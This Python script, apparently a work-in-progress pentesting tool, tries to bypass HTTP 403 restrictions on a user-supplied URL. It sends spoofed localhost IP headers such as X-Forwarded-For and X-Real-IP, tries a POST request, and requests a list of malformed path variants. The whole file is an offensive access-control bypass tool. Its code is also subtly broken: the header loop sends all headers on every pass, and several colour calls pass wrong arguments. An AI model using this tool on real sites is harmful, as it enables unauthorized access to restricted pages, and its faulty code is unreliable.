# Made by Suphawith Phusanbai - A lazy pentester
### Working in progress ###

from termcolor import colored
import requests

def bypass_using_headers(url):
    print(colored(f"[1st] Task - Bypassing using headers", 'black', 'on_green', attrs=['bold']))
    # if you know more you can add them here.
    headers = {
        "X-ProxyUser-Ip": "127.0.0.1",
        "Client-IP": "127.0.0.1",
        "X-Originating-IP":"127.0.0.1",
        "X-Forwarded-For":"127.0.0.1",
        "X-Remote-IP":"127.0.0.1",
        "X-Remote-Addr":"127.0.0.1",
        "X-Real-IP":"127.0.0.1",
        "Referer":"https://127.0.0.1",
        "X-Forwarded-Host": "127.0.0.1",
        "X-Custom-IP-Authorization":"127.0.0.1",
    }
    for everyheaders in headers:
        response = requests.get(url, headers=headers)
        print(colored(f"[+] Trying {everyheaders} technique",'yellow',attrs=['bold']))
        print("[+] HTTP STATUS CODE:", response.status_code)
        if response.status_code == 200:
            print(colored("[+] It works!:", response.text, 'green',attrs=['bold']))
        elif response.status_code == 403:
            print(colored("[-] Failed :(", 'red',attrs=['bold']))
        else:
            print(colored("[!] Connection Failed:", response.status_code,'red',attrs=['bold']))
         
def bypass_using_POST_method(url):
    print(colored(f"[2nd] Task - Bypassing using POST method request", 'black', 'on_green', attrs=['bold']))
    print(colored("[+] Using HTTP POST method.",'yellow',attrs=['bold']))
    # try POST method
    post_header = {
        "Content-Length":"0"
    }
    post_method = requests.post(url, headers=post_header)
    if post_method.status_code == 200:
        print(colored("[+] It works!:", post_method.status_code, 'green',attrs=['bold']))
        print(colored("[+] HTTP Response:", post_method.text, 'green',attrs=['bold']))
    else:
        print(colored(f"[!] HTTP Response is not 200 but {post_method.status_code}", 'red', attrs=['bold']))
    
def bypass_using_malformed_path(url, dir_path):
    if dir_path == "N" or dir_path.strip() == "":
        return
    malformed_paths = [
        f"{dir_path}/*",
        f"*{dir_path}/",
        f"%2{dir_path}/",
        f"%2f{dir_path}%2f",
        f"./{dir_path}/",
        f"/{dir_path}/./",
        f"//{dir_path}///",
        f";/{dir_path}/",
        f"/;//{dir_path}/",
    ]
    print(colored(f"[3rd] Task - Bypassing using malformed paths", 'black', 'on_green', attrs=['bold']))
    for path in malformed_paths:
        fullpath = f"{url}{path}"
        print(colored(f"[+] Trying: {fullpath}", 'yellow', attrs=['bold']))
        path_availability_check = requests.get(fullpath)
        if path_availability_check.status_code == 404:
            print(colored(f"[-] Path not found: {path_availability_check.status_code}", 'red', attrs=['bold']))
        elif path_availability_check.status_code == 403:
            print(colored("[-] Failed :(", 'red', attrs=['bold']))
        elif path_availability_check.status_code == 200:
            print(colored(f"[+] It works!: {path_availability_check.status_code}", 'green', attrs=['bold']))
        else:
            print(colored(f"[!] HTTP Response is not 200 but {path_availability_check.status_code}", 'red', attrs=['bold']))

url = input("Enter the restricted 403 page URL (Without / after domain name):")
dir_path = input("Enter the path name or leave it blank (ex. /admin):")
bypass_using_headers(url)
bypass_using_POST_method(url)
bypass_using_malformed_path(url,dir_path)
